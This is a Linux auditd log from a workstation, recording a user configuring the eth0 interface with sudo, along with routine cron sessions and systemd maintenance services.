type=CWD msg=audit(1789327303.605:143): cwd="/home/Tom"
type=PATH msg=audit(1789327303.605:143): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327303.605:143): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327303.605:143): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327303.605:143): proctitle=7375646F006970006164647200616464003139322E3136382E302E32312F3234006465760065746830
type=USER_ACCT msg=audit(1789327303.613:144): pid=687 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327303.613:145): pid=687 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206164647220616464203139322E3136382E302E32312F3234206465762065746830 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327303.613:146): pid=687 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327303.613:147): pid=687 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327303.617:148): pid=687 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327303.617:149): pid=687 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327310.125:150): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a5434e0 a1=55a97a4ad370 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=690 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sudo" exe="/usr/bin/sudo" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327310.125:150): argc=6 a0="sudo" a1="ip" a2="link" a3="set" a4="eth0" a5="up"
type=CWD msg=audit(1789327310.125:150): cwd="/home/Tom"
type=PATH msg=audit(1789327310.125:150): item=0 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327310.125:150): item=1 name="/usr/bin/sudo" inode=424386 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327310.125:150): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327310.125:150): proctitle=7375646F006970006C696E6B007365740065746830007570
type=USER_ACCT msg=audit(1789327310.129:151): pid=690 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_CMD msg=audit(1789327310.129:152): pid=690 uid=1000 auid=1000 ses=1 subj=unconfined msg='cwd="/home/Tom" cmd=6970206C696E6B207365742065746830207570 exe="/usr/bin/sudo" terminal=tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_REFR msg=audit(1789327310.133:153): pid=690 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789327310.133:154): pid=690 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_END msg=audit(1789327310.137:155): pid=690 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_close grantors=pam_limits,pam_permit,pam_unix acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_DISP msg=audit(1789327310.137:156): pid=690 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/sudo" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=SYSCALL msg=audit(1789327337.593:157): arch=c000003e syscall=59 success=yes exit=0 a0=55a97a513710 a1=55a97a4d20a0 a2=55a97a447390 a3=33894510fd2ba690 items=3 ppid=630 pid=693 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ip" exe="/usr/bin/ip" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789327337.593:157): argc=2 a0="ip" a1="a"
type=CWD msg=audit(1789327337.593:157): cwd="/home/Tom"
type=PATH msg=audit(1789327337.593:157): item=0 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327337.593:157): item=1 name="/usr/bin/ip" inode=398712 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789327337.593:157): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789327337.593:157): proctitle=69700061
type=SERVICE_START msg=audit(1789327343.105:158): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789327343.105:159): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-tmpfiles-clean comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789330621.565:160): pid=712 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789330621.565:161): pid=712 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789330621.565:162): pid=712 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=4 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789330621.565:162): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=712 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789330621.565:162): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789330621.565:163): pid=712 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789330621.565:164): pid=713 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789330621.569:165): pid=712 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789330621.569:166): pid=712 uid=0 auid=0 ses=4 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789334221.585:167): pid=731 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789334221.585:168): pid=731 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789334221.585:169): pid=731 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=5 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789334221.585:169): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=731 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=5 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789334221.585:169): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789334221.585:170): pid=731 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789334221.589:171): pid=732 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789334221.593:172): pid=731 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789334221.593:173): pid=731 uid=0 auid=0 ses=5 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789337821.609:174): pid=754 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789337821.609:175): pid=754 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789337821.609:176): pid=754 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=6 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789337821.609:176): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=754 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=6 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789337821.609:176): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789337821.613:177): pid=754 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789337821.617:178): pid=755 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789337821.617:179): pid=754 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789337821.617:180): pid=754 uid=0 auid=0 ses=6 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=BPF msg=audit(1789340406.553:181): prog-id=12 op=LOAD
type=SERVICE_START msg=audit(1789340406.589:182): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dpkg-db-backup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789340406.589:183): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dpkg-db-backup comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789340406.621:184): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=logrotate comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789340406.621:185): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=logrotate comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789340406.637:186): prog-id=12 op=UNLOAD
type=SERVICE_START msg=audit(1789341204.113:187): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=fstrim comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789341204.113:188): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=fstrim comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789341421.637:189): pid=790 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789341421.637:190): pid=790 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789341421.637:191): pid=790 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=7 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789341421.637:191): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=790 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=7 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789341421.637:191): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789341421.637:192): pid=790 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789341421.637:193): pid=791 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789341421.641:194): pid=790 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789341421.641:195): pid=790 uid=0 auid=0 ses=7 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=SERVICE_START msg=audit(1789344847.381:196): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789344847.381:197): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=apt-daily comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789345021.661:198): pid=856 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789345021.661:199): pid=856 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789345021.661:200): pid=856 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=8 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789345021.661:200): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=856 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=8 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789345021.661:200): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789345021.661:201): pid=856 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789345021.665:202): pid=857 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789345021.665:203): pid=856 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789345021.665:204): pid=856 uid=0 auid=0 ses=8 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789348621.684:205): pid=874 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789348621.684:206): pid=874 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789348621.684:207): pid=874 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=9 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789348621.684:207): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=874 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=9 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789348621.684:207): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789348621.684:208): pid=874 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789348621.688:209): pid=875 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789348621.692:210): pid=874 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789348621.692:211): pid=874 uid=0 auid=0 ses=9 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789351801.708:212): pid=895 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789351801.708:213): pid=895 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789351801.708:214): pid=895 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=10 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789351801.708:214): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=895 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=10 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789351801.708:214): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789351801.708:215): pid=895 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789351801.712:216): pid=896 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789351801.712:217): pid=895 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_END msg=audit(1789351801.712:218): pid=895 uid=0 auid=0 ses=10 subj=unconfined msg='op=PAM:session_close grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=USER_ACCT msg=audit(1789352221.716:219): pid=899 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789352221.720:220): pid=899 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789352221.720:221): pid=899 uid=0 subj=unconfined old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=11 res=1UID="root" OLD-AUID="unset" AUID="root"
type=SYSCALL msg=audit(1789352221.720:221): arch=c000003e syscall=1 success=yes exit=1 a0=7 a1=7ffe2c27d440 a2=1 a3=7ffe2c27d157 items=0 ppid=586 pid=899 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=11 comm="cron" exe="/usr/sbin/cron" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="root" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789352221.720:221): proctitle=2F7573722F7362696E2F43524F4E002D66
type=USER_START msg=audit(1789352221.720:222): pid=899 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:session_open grantors=pam_loginuid,pam_env,pam_env,pam_permit,pam_unix,pam_limits acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_REFR msg=audit(1789352221.724:223): pid=900 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
type=CRED_DISP msg=audit(1789352221.724:224): pid=899 uid=0 auid=0 ses=11 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/sbin/cron" hostname=? addr=? terminal=cron res=success'UID="root" AUID="root"
